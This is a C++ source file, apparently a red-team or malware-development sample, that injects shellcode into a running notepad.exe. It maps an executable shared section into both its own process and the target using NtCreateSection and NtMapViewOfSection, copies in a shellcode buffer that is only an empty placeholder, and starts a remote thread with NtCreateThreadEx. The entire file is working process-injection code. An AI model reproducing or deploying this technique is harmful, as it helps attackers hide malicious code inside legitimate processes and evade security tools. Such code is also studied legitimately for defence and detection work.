#include <iostream>
#include "NTAPIs.h"
#include <tlhelp32.h>

unsigned char shellcode[] = {0};

DWORD getProcess() {
	HANDLE hSnapshot{};

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe{.dwSize = sizeof(PROCESSENTRY32)};

	do {
		if (!strcmp(pe.szExeFile,"notepad.exe") ) {
			std::cout << "Process id: " << pe.th32ProcessID << std::endl;
			return pe.th32ProcessID;
		}
	} while (Process32Next(hSnapshot, &pe));

	std::cout << "Did not find any process names notepad.exe" << '\n';
	std::exit(1);
}

int main() {

	HMODULE ntdll = LoadLibrary("ntdll.dll");
	NT::NtMapViewOfSection NtMapViewOfSection    = ( NT::NtMapViewOfSection )GetProcAddress( ntdll, "NtMapViewOfSection" );
	NT::NtCreateThreadEx   NtCreateRemoteThread  = ( NT::NtCreateThreadEx )GetProcAddress( ntdll, "NtCreateThreadEx" );
	NT::NtCreatSection     NtCreateSection       = ( NT::NtCreatSection )GetProcAddress( ntdll, "NtCreateSection" );
	NT::NtOpenProcess      NtOpenProcess         = ( NT::NtOpenProcess )GetProcAddress( ntdll, "NtOpenProcess" );
	NT::NtClose            NtClose               = ( NT::NtClose )GetProcAddress( ntdll, "NtClose" );

	NT::OBJECT_ATTRIBUTES OA{};
	InitializeObjectAttributes(&OA, NULL, 0, NULL, NULL);

	LARGE_INTEGER	lpSectionSize {sizeof(shellcode)};

	HANDLE       hLocalProcess  {GetCurrentProcess()},
		     hRemoteProcess {},
		     hMappedSection {},
		     hThread        {};

	PVOID        lBuffer        {},
		     rBuffer        {};

	NT::NTSTATUS STATUS         {};


	hRemoteProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,getProcess());
	if (hRemoteProcess == NULL) {
		std::cerr << "Failed to open process " << '\n';
		return 1;
	}

	// Create a shared memory section
	STATUS = NtCreateSection(&hMappedSection,SECTION_ALL_ACCESS, &OA, &lpSectionSize,PAGE_EXECUTE_READWRITE,SEC_COMMIT,NULL);
	if (!NT_SUCCESS(STATUS)) {
		std::cerr << "NtCreateSection failed! " << NT::GetLastError() << '\n';
		return 1;
	}
	std::cout << "Created section \n";

	// Allow our current process to access the section
	STATUS = NtMapViewOfSection(hMappedSection,hLocalProcess,&lBuffer,NULL,NULL,NULL,(SIZE_T*)&lpSectionSize,(NT::SECTION_INHERIT)2,NULL,PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(STATUS)) {
		std::cerr << "NtMapViewOfSection failed! " << NT::GetLastError() << '\n';
		return 1;
	}
	std::cout << "Mapped local address at << " << lBuffer << "\n";


	// Do the same for the target process
	STATUS = NtMapViewOfSection(hMappedSection,hRemoteProcess,&rBuffer,NULL,NULL,NULL,(SIZE_T*)&lpSectionSize,(NT::SECTION_INHERIT)2,NULL,PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(STATUS)) {
		std::cerr << "NtMapViewOfSection 2 failed! " << NT::GetLastError() << '\n';
		return 1;
	}
	std::cout << "Mapped remote address at << " << rBuffer << "\n";

	// Copy shellcode into mapped section
	memcpy(lBuffer,shellcode,sizeof(shellcode));

	// Execute the shellcode where the target process can access the section
	STATUS = NtCreateRemoteThread(&hThread, THREAD_ALL_ACCESS, &OA, hRemoteProcess, (NT::PUSER_THREAD_START_ROUTINE)rBuffer, NULL, 0, NULL, NULL, NULL, NULL);
	if (!NT_SUCCESS(STATUS)) {
		std::cerr << "NtCreateRemoteThread failed! " << NT::GetLastError() << '\n';
		return 1;
	}
	std::cout << "Created thread\n";

	getchar();


}
